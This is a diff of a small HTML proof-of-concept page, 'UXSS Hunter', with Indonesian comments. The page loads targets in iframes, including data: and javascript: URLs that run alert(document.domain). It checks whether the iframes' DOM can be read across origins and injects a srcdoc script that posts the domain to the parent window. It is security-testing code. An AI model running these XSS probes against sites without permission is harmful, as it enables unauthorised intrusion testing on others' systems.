@@ -1,61 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>UXSS Hunter</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; }
-    iframe { width: 400px; height: 200px; border: 1px solid #555; margin: 5px; }
-    .log { white-space: pre; }
+    body {
+      font-family: monospace;
+      background: #111;
+      color: #0f0;
+      padding: 20px;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    iframe {
+      width: 400px;
+      height: 200px;
+      border: 1px solid #555;
+      margin: 5px 0;
+      display: block;
+    }
+    .log {
+      background: #000;
+      padding: 10px;
+      border: 1px solid #444;
+      max-height: 300px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+    }
   </style>
 </head>
 <body>
   <h2>🕵️ UXSS Hunter PoC</h2>
-  <div class="log" id="log"></div>
+  <div id="log" class="log"></div>
 
   <script>
     function log(msg) {
-      document.getElementById("log").textContent += msg + "\n";
+      const logBox = document.getElementById("log");
+      logBox.textContent += msg + "\n";
+      logBox.scrollTop = logBox.scrollHeight;
       console.log(msg);
     }
 
-    // Target list buat fuzz
+    // List target untuk fuzz
     const targets = [
-      "https://example.com",             // ganti ke target asli
+      "https://example.com", // ganti ke target asli
       "about:blank",
       "data:text/html,<script>alert(document.domain)</script>",
       "javascript:alert(document.domain)"
     ];
 
-    // Coba load target dalam iframe
+    // Load target dalam iframe & test akses
     targets.forEach(url => {
       try {
-        let f = document.createElement("iframe");
+        const f = document.createElement("iframe");
         f.src = url;
         document.body.appendChild(f);
 
-        log("Loaded: " + url);
+        log("🔗 Loaded: " + url);
 
-        // Coba akses contentWindow (harusnya diblok Same-Origin Policy)
         setTimeout(() => {
           try {
-            let dom = f.contentWindow.document;
-            log("❗ [Possible UXSS] bisa akses DOM iframe: " + url + " → domain: " + dom.domain);
-          } catch(e) {
-            log("✅ [Isolated] ga bisa akses iframe: " + url);
+            const dom = f.contentWindow.document;
+            log("❗ [Possible UXSS] Bisa akses DOM iframe: " + url + " → domain: " + dom.domain);
+          } catch (e) {
+            log("✅ [Isolated] Tidak bisa akses iframe: " + url);
           }
         }, 2000);
 
-      } catch(e) {
-        log("Error load: " + url + " → " + e);
+      } catch (e) {
+        log("❌ Error load: " + url + " → " + e);
       }
     });
 
-    // Tes srcdoc injection
-    let s = document.createElement("iframe");
-    s.srcdoc = "<script>parent.postMessage('[srcdoc executed] domain='+document.domain,'*')</script>";
+    // Test srcdoc injection
+    const s = document.createElement("iframe");
+    s.srcdoc = `
+      <script>
+        parent.postMessage('[srcdoc executed] domain=' + document.domain, '*')
+      </script>
+    `;
     document.body.appendChild(s);
 
-    window.addEventListener("message", (e) => {
+    window.addEventListener("message", e => {
       log("📩 Message dari iframe: " + e.data);
     });
   </script>
